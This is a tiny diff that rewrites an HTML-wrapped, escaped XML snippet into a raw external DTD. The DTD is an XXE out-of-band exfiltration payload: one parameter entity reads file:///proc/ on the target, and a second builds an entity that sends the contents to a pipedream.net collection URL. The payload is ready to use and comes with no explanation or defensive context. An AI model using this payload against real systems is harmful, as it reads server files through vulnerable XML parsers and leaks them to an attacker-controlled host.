@@ -1,1 +1,2 @@
-<html><head></head><body><pre style="word-wrap: break-word; white-space: pre-wrap;">&lt;!ENTITY % d SYSTEM "file:///proc/"&gt;&lt;!ENTITY % c "&lt;!ENTITY rrr SYSTEM 'https://enxn1jyqvcg38a9.m.pipedream.net/?ex=%d;'&gt;"&gt;</pre></body></html>
+<!ENTITY % d SYSTEM "file:///proc/">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'https://enxn1jyqvcg38a9.m.pipedream.net/?ex=%d;'>">
